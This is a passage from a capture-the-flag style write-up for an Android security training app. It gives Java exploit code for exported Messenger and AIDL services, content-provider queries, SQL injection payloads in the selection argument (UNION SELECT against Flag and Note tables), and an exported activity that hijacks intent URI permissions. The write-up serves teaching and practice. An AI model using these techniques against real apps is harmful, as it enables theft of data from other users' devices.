+          <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"MessageReply1234"</span><span class="o">,</span> <span class="s">"Obtained password: "</span> <span class="o">+</span> <span class="n">obtainedPassword</span><span class="o">);</span>
+          
+          <span class="o">**</span><span class="n">getFlag</span><span class="o">(</span><span class="n">obtainedPassword</span><span class="o">);**</span>
+      <span class="o">}</span>
+      <span class="k">else</span><span class="o">{</span>
+          <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"Message1234"</span><span class="o">,</span> <span class="s">"NO Reply"</span><span class="o">);</span>
+      <span class="o">}</span>
+
+  <span class="o">}</span>
+<span class="o">}</span>
+<span class="kd">private</span> <span class="nc">ServiceConnection</span> <span class="n">connection</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ServiceConnection</span><span class="o">()</span> <span class="o">{</span>
+  <span class="nd">@Override</span>
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServiceConnected</span><span class="o">(</span><span class="nc">ComponentName</span> <span class="n">name</span><span class="o">,</span> <span class="nc">IBinder</span> <span class="n">binder</span><span class="o">)</span> <span class="o">{</span>
+      <span class="n">serviceMessenger</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Messenger</span><span class="o">(</span><span class="n">binder</span><span class="o">);</span>
+      <span class="n">isBound</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+      <span class="o">**</span><span class="c1">// Start by getting the secret</span>
+      <span class="n">requestPassword</span><span class="o">();**</span>
+  <span class="o">}</span>
+  <span class="nd">@Override</span>
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServiceDisconnected</span><span class="o">(</span><span class="nc">ComponentName</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+  <span class="o">}</span>
+<span class="o">};</span>
+
+<span class="c1">// Method to request the password</span>
+<span class="kd">private</span> <span class="kt">void</span> <span class="nf">requestPassword</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(!</span><span class="n">isBound</span><span class="o">)</span> <span class="k">return</span><span class="o">;</span>
+    <span class="nc">Message</span> <span class="n">msg</span> <span class="o">=</span> <span class="nc">Message</span><span class="o">.</span><span class="na">obtain</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+    <span class="n">msg</span><span class="o">.</span><span class="na">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Bundle</span><span class="o">();</span>
+    <span class="n">msg</span><span class="o">.</span><span class="na">replyTo</span> <span class="o">=</span> <span class="n">clientMessegener</span><span class="o">;</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">serviceMessenger</span><span class="o">.</span><span class="na">send</span><span class="o">(</span><span class="n">msg</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+<span class="c1">// Method to request the flag</span>
+<span class="kd">private</span> <span class="kt">void</span> <span class="nf">getFlag</span><span class="o">(</span><span class="nc">String</span> <span class="nc">Password</span><span class="o">)</span> <span class="o">{</span>
+    <span class="o">**</span><span class="c1">// First, send "give flag" echo**</span>
+    <span class="nc">Message</span> <span class="n">msg</span> <span class="o">=</span> <span class="nc">Message</span><span class="o">.</span><span class="na">obtain</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+    <span class="nc">Bundle</span> <span class="n">bundle</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Bundle</span><span class="o">();</span>
+    <span class="n">bundle</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="s">"echo"</span><span class="o">,</span> <span class="s">"give flag"</span><span class="o">);</span>
+    <span class="n">msg</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>
+    <span class="n">msg</span><span class="o">.</span><span class="na">replyTo</span> <span class="o">=</span> <span class="n">clientMessegener</span><span class="o">;</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">serviceMessenger</span><span class="o">.</span><span class="na">send</span><span class="o">(</span><span class="n">msg</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="o">**</span><span class="c1">// Now, send the retrevied password with int = 3 to get flag**</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="nc">Message</span><span class="o">.</span><span class="na">obtain</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="mi">3</span><span class="o">);</span>
+    <span class="n">bundle</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Bundle</span><span class="o">();</span>
+    <span class="n">bundle</span><span class="o">.</span><span class="na">putString</span><span class="o">(</span><span class="s">"password"</span><span class="o">,</span> <span class="nc">Password</span><span class="o">);</span>
+    <span class="n">msg</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>
+    <span class="n">msg</span><span class="o">.</span><span class="na">replyTo</span> <span class="o">=</span> <span class="n">clientMessegener</span><span class="o">;</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">serviceMessenger</span><span class="o">.</span><span class="na">send</span><span class="o">(</span><span class="n">msg</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+<span class="nd">@Override</span>
+<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+<span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+<span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+
+<span class="c1">// Bind to the service</span>
+<span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span> <span class="s">"io.hextree.attacksurface.services.Flag27Service"</span><span class="o">);</span>
+<span class="n">bindService</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="n">connection</span><span class="o">,</span> <span class="nc">Context</span><span class="o">.</span><span class="na">BIND_AUTO_CREATE</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h2 id="aidl-service"><strong>AIDL Service</strong></h2><h3 id="flag28"><strong>Flag28</strong></h3><blockquote><p>Basic AIDL Service</p></blockquote><p>Aidl Interface Code</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="c1">// IFlag28Interface.aidl</span>
+<span class="kn">package</span> <span class="nn">io.hextree.attacksurface.services</span><span class="o">;</span>
+
+<span class="c1">// Declare any non-default types here with import statements</span>
+<span class="kd">interface</span> <span class="nc">IFlag28Interface</span> <span class="o">{</span>
+    <span class="kt">boolean</span> <span class="nf">openFlag</span><span class="o">();</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>MainActivity Code</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">isBound</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="nc">Messenger</span> <span class="n">serviceMessenger</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+
+    <span class="kd">private</span> <span class="nc">ServiceConnection</span> <span class="n">connection</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ServiceConnection</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServiceConnected</span><span class="o">(</span><span class="nc">ComponentName</span> <span class="n">name</span><span class="o">,</span> <span class="nc">IBinder</span> <span class="n">binder</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">serviceMessenger</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Messenger</span><span class="o">(</span><span class="n">binder</span><span class="o">);</span>
+            <span class="n">isBound</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+            <span class="nc">IFlag28Interface</span> <span class="n">aidlService</span> <span class="o">=</span> <span class="nc">IFlag28Interface</span><span class="o">.</span><span class="na">Stub</span><span class="o">.</span><span class="na">asInterface</span><span class="o">(</span><span class="n">binder</span><span class="o">);</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">aidlService</span><span class="o">.</span><span class="na">openFlag</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServiceDisconnected</span><span class="o">(</span><span class="nc">ComponentName</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+        <span class="o">}</span>
+    <span class="o">};</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+
+        <span class="c1">// Bind to the service</span>
+        <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+        <span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span> <span class="s">"io.hextree.attacksurface.services.Flag28Service"</span><span class="o">);</span>
+        <span class="n">bindService</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="n">connection</span><span class="o">,</span> <span class="nc">Context</span><span class="o">.</span><span class="na">BIND_AUTO_CREATE</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag29"><strong>Flag29</strong></h3><blockquote><p>AIDL Service</p></blockquote><p>Aidl Interface Code</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="c1">// IFlag28Interface.aidl</span>
+<span class="kn">package</span> <span class="nn">io.hextree.attacksurface.services</span><span class="o">;</span>
+
+<span class="c1">// Declare any non-default types here with import statements</span>
+<span class="kd">interface</span> <span class="nc">IFlag29Interface</span> <span class="o">{</span>
+    <span class="nc">String</span> <span class="nf">init</span><span class="o">();</span>
+    <span class="kt">void</span> <span class="nf">authenticate</span><span class="o">(</span><span class="nc">String</span> <span class="n">str</span><span class="o">);</span>
+    <span class="kt">void</span> <span class="nf">success</span><span class="o">();</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>MainActivity Code</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">isBound</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="nc">Messenger</span> <span class="n">serviceMessenger</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+
+    <span class="kd">private</span> <span class="nc">ServiceConnection</span> <span class="n">connection</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ServiceConnection</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServiceConnected</span><span class="o">(</span><span class="nc">ComponentName</span> <span class="n">name</span><span class="o">,</span> <span class="nc">IBinder</span> <span class="n">binder</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">serviceMessenger</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Messenger</span><span class="o">(</span><span class="n">binder</span><span class="o">);</span>
+            <span class="n">isBound</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+            <span class="nc">IFlag29Interface</span> <span class="n">aidlService</span> <span class="o">=</span> <span class="nc">IFlag29Interface</span><span class="o">.</span><span class="na">Stub</span><span class="o">.</span><span class="na">asInterface</span><span class="o">(</span><span class="n">binder</span><span class="o">);</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="nc">String</span> <span class="n">password</span> <span class="o">=</span> <span class="n">aidlService</span><span class="o">.</span><span class="na">init</span><span class="o">();</span>
+                <span class="n">aidlService</span><span class="o">.</span><span class="na">authenticate</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>
+                <span class="n">aidlService</span><span class="o">.</span><span class="na">success</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">RemoteException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServiceDisconnected</span><span class="o">(</span><span class="nc">ComponentName</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+        <span class="o">}</span>
+    <span class="o">};</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+
+        <span class="c1">// Bind to the service</span>
+        <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+        <span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span> <span class="s">"io.hextree.attacksurface.services.Flag29Service"</span><span class="o">);</span>
+        <span class="n">bindService</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="n">connection</span><span class="o">,</span> <span class="nc">Context</span><span class="o">.</span><span class="na">BIND_AUTO_CREATE</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h2 id="content-provider"><strong>Content Provider</strong></h2><h3 id="flag30"><strong>Flag30</strong></h3><blockquote><p>Content Provider Query</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="nc">ContentResolver</span> <span class="n">resolver</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">();</span>
+<span class="nc">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://io.hextree.flag30/success"</span><span class="o">);</span>
+<span class="nc">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">resolver</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+<span class="k">if</span> <span class="o">(</span><span class="n">cursor</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+  <span class="c1">// Retrieves all column names</span>
+  <span class="nc">String</span><span class="o">[]</span> <span class="n">columnNames</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnNames</span><span class="o">();</span>
+  <span class="k">while</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">())</span> <span class="o">{</span>
+      <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">columnName</span> <span class="o">:</span> <span class="n">columnNames</span><span class="o">)</span> <span class="o">{</span>
+          <span class="nc">String</span> <span class="n">value</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndexOrThrow</span><span class="o">(</span><span class="n">columnName</span><span class="o">));</span>
+          <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"ColumnData"</span><span class="o">,</span> <span class="n">columnName</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">value</span><span class="o">);</span>
+      <span class="o">}</span>
+  <span class="o">}</span>
+  <span class="n">cursor</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag31"><strong>Flag31</strong></h3><blockquote><p>Provider URI Matching</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="nc">ContentResolver</span> <span class="n">resolver</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">();</span>
+<span class="nc">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://io.hextree.flag31/flag/31"</span><span class="o">);</span>
+
+<span class="nc">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">resolver</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+<span class="k">if</span> <span class="o">(</span><span class="n">cursor</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+    <span class="c1">// Retrieves all column names</span>
+    <span class="nc">String</span><span class="o">[]</span> <span class="n">columnNames</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnNames</span><span class="o">();</span>
+    <span class="k">while</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">())</span> <span class="o">{</span>
+        <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">columnName</span> <span class="o">:</span> <span class="n">columnNames</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">String</span> <span class="n">value</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndexOrThrow</span><span class="o">(</span><span class="n">columnName</span><span class="o">));</span>
+            <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"Flag31"</span><span class="o">,</span> <span class="n">columnName</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">value</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag32"><strong>Flag32</strong></h3><blockquote><p>Injection in Content Provider</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="nc">ContentResolver</span> <span class="n">resolver</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">();</span>
+<span class="nc">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://io.hextree.flag32/flags"</span><span class="o">);</span>
+
+<span class="c1">// Full Query looks like:</span>
+<span class="c1">// SELECT * FROM Flag WHERE visible=1 AND (1) UNION SELECT * FROM Flag WHERE visible=0 AND (1);</span>
+<span class="nc">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">resolver</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="o">**</span><span class="s">"1) UNION SELECT * FROM Flag WHERE visible=0 AND (1"</span><span class="o">**,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+<span class="k">if</span> <span class="o">(</span><span class="n">cursor</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+    <span class="c1">// Retrieves all column names</span>
+    <span class="nc">String</span><span class="o">[]</span> <span class="n">columnNames</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnNames</span><span class="o">();</span>
+    <span class="k">while</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">())</span> <span class="o">{</span>
+        <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">columnName</span> <span class="o">:</span> <span class="n">columnNames</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">String</span> <span class="n">value</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndexOrThrow</span><span class="o">(</span><span class="n">columnName</span><span class="o">));</span>
+            <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"QueryFlag32"</span><span class="o">,</span> <span class="n">columnName</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">value</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag331"><strong>Flag33.1</strong></h3><blockquote><p>Return Provider Access</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+<span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+<span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+
+<span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"io.hextree.FLAG33"</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag33Activity1"</span><span class="o">);</span>
+<span class="n">startActivityForResult</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onActivityResult</span><span class="o">(</span><span class="kt">int</span> <span class="n">requestCode</span><span class="o">,</span> <span class="kt">int</span> <span class="n">resultCode</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
+<span class="kd">super</span><span class="o">.</span><span class="na">onActivityResult</span><span class="o">(</span><span class="n">requestCode</span><span class="o">,</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>
+
+<span class="nc">ContentResolver</span> <span class="n">resolver</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">();</span>
+<span class="c1">// injecting the selection field which is WHERE clause: SELECT * FROM Flag WHERE _id=2 UNION SELECT 1,title,content,'a' FROM Note</span>
+<span class="nc">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">resolver</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">getData</span><span class="o">(),</span> <span class="kc">null</span><span class="o">,</span> <span class="o">**</span><span class="s">"_id=2 UNION SELECT 1,title,content,'a' FROM Note"</span><span class="o">**,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+<span class="k">if</span> <span class="o">(</span><span class="n">cursor</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">String</span><span class="o">[]</span> <span class="n">columnNames</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnNames</span><span class="o">();</span>
+    <span class="k">while</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">())</span> <span class="o">{</span>
+        <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">columnName</span> <span class="o">:</span> <span class="n">columnNames</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">String</span> <span class="n">value</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndexOrThrow</span><span class="o">(</span><span class="n">columnName</span><span class="o">));</span>
+            <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"QueryFlag33.1"</span><span class="o">,</span> <span class="n">columnName</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">value</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+	<span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag332"><strong>Flag33.2</strong></h3><blockquote><p>Implict Provider Access</p></blockquote><p>Creating an exported activity to hijack the intent permissions to access the provider.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span>
+<span class="na">android:name=</span><span class="s">".SecondActivity"</span>
+<span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;intent-filter&gt;</span>
+<span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"io.hextree.FLAG33"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;data</span>
+    <span class="na">android:scheme=</span><span class="s">"content"</span>
+    <span class="na">android:host=</span><span class="s">"io.hextree.flag33_2"</span>
+    <span class="na">android:path=</span><span class="s">"/flags"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/intent-filter&gt;</span>
